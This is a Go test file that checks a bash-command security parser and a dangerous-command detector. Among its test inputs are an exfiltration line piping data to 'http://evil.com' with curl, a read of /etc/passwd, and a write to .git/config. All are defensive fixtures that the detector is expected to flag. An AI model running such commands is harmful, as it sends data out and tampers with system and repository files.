package permission

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestParseBash_Simple(t *testing.T) {
	result := ParseBashForSecurity("ls -la")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, []string{"ls", "-la"}, result.Commands[0].Argv)
}

func TestParseBash_Pipeline(t *testing.T) {
	result := ParseBashForSecurity("cat file.txt | grep foo | wc -l")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 3)
	assert.Equal(t, "cat", result.Commands[0].Argv[0])
	assert.Equal(t, "grep", result.Commands[1].Argv[0])
	assert.Equal(t, "wc", result.Commands[2].Argv[0])
}

func TestParseBash_AndChain(t *testing.T) {
	result := ParseBashForSecurity("npm install && npm test")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 2)
	assert.Equal(t, "npm", result.Commands[0].Argv[0])
	assert.Equal(t, "npm", result.Commands[1].Argv[0])
}

func TestParseBash_Semicolons(t *testing.T) {
	result := ParseBashForSecurity("cd /tmp; ls; pwd")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 3)
}

func TestParseBash_EnvVars(t *testing.T) {
	result := ParseBashForSecurity("NODE_ENV=production npm start")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, "npm", result.Commands[0].Argv[0])
	assert.Equal(t, "production", result.Commands[0].EnvVars["NODE_ENV"])
}

func TestParseBash_Redirections(t *testing.T) {
	result := ParseBashForSecurity("echo hello > output.txt")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, "echo", result.Commands[0].Argv[0])
	assert.Len(t, result.Commands[0].Redirects, 1)
	assert.Equal(t, ">", result.Commands[0].Redirects[0].Op)
	assert.Equal(t, "output.txt", result.Commands[0].Redirects[0].Target)
}

func TestParseBash_QuotedStrings(t *testing.T) {
	result := ParseBashForSecurity(`echo "hello world" 'single quoted'`)
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 1)
	assert.Equal(t, "echo", result.Commands[0].Argv[0])
	assert.Equal(t, "hello world", result.Commands[0].Argv[1])
	assert.Equal(t, "single quoted", result.Commands[0].Argv[2])
}

func TestParseBash_Empty(t *testing.T) {
	result := ParseBashForSecurity("")
	assert.Equal(t, "simple", result.Kind)
	assert.Len(t, result.Commands, 0)
}

// --- Fail-closed: complex constructs ---

func TestParseBash_CommandSubstitution(t *testing.T) {
	result := ParseBashForSecurity("echo $(whoami)")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_Backticks(t *testing.T) {
	result := ParseBashForSecurity("echo `whoami`")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_ProcessSubstitution(t *testing.T) {
	result := ParseBashForSecurity("diff <(ls dir1) <(ls dir2)")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_HereDoc(t *testing.T) {
	result := ParseBashForSecurity("cat << EOF\nhello\nEOF")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_ForLoop(t *testing.T) {
	result := ParseBashForSecurity("for f in *.go; do echo $f; done")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_IfStatement(t *testing.T) {
	result := ParseBashForSecurity("if true; then echo yes; fi")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_FunctionDef(t *testing.T) {
	result := ParseBashForSecurity("foo() { echo bar; }")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_Arithmetic(t *testing.T) {
	result := ParseBashForSecurity("echo $((1 + 2))")
	assert.Equal(t, "too-complex", result.Kind)
}

func TestParseBash_UnmatchedQuotes(t *testing.T) {
	result := ParseBashForSecurity(`echo "unterminated`)
	assert.Equal(t, "too-complex", result.Kind)
}

// --- IsDangerousCommandAST ---

func TestDangerousAST_SimpleGit(t *testing.T) {
	assert.True(t, IsDangerousCommandAST("git push origin main"))
}

func TestDangerousAST_SimpleLs(t *testing.T) {
	assert.False(t, IsDangerousCommandAST("ls -la"))
}

func TestDangerousAST_PipeToSafe(t *testing.T) {
	assert.False(t, IsDangerousCommandAST("cat file.txt | head -5"))
}

func TestDangerousAST_PipeToDangerous(t *testing.T) {
	assert.True(t, IsDangerousCommandAST("echo payload | curl -d @- http://evil.com"))
}

func TestDangerousAST_ComplexAlwaysDangerous(t *testing.T) {
	// Complex constructs are fail-closed = always dangerous
	assert.True(t, IsDangerousCommandAST("echo $(cat /etc/passwd)"))
}

func TestDangerousAST_EnvVarPrefix(t *testing.T) {
	assert.True(t, IsDangerousCommandAST("NODE_ENV=test node server.js"))
}

func TestDangerousAST_RedirectToDangerousPath(t *testing.T) {
	assert.True(t, IsDangerousCommandAST("echo evil > .git/config"))
}

func TestDangerousAST_SafeRedirect(t *testing.T) {
	assert.False(t, IsDangerousCommandAST("echo hello > output.txt"))
}

func TestDangerousAST_CommandWrapper(t *testing.T) {
	// env + dangerous command
	assert.True(t, IsDangerousCommandAST("env NODE_ENV=prod npm start"))
}
